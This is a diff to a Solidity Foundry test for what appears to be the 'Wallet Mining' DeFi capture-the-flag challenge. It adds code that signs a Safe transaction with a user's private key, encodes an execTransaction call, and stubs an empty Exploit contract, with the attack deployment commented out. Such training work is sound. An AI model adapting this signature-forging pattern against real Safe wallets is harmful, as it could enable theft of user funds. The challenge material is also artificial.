@@ -177,8 +177,21 @@ contract WalletMiningChallenge is Test {
                         nonce
                     )
                 );
+                bytes32 domainSeparator = keccak256(abi.encode(
+                    0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218,
+                    singletonCopy.getChainId(),
+                    USER_DEPOSIT_ADDRESS
+                ));
+                // Sign the tx hash using user's private key
+                bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
+                (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+                signatures = abi.encodePacked(r, s, v);
             }
+            // Encode execTransation call data 
+            execData = abi.encodeWithSelector(singletonCopy.execTransaction.selector, to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, nonce, signatures);
         }
+        // Deploy the Safe and attack
+        // new Exploit(token, authorizer, walletDeployer, USER_DEPOSIT_ADDRESS, ward, initializer, nonce, execData);
     }
 
     /**
@@ -210,4 +223,7 @@ contract WalletMiningChallenge is Test {
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
     }
+}
+contract Exploit {
+
 }
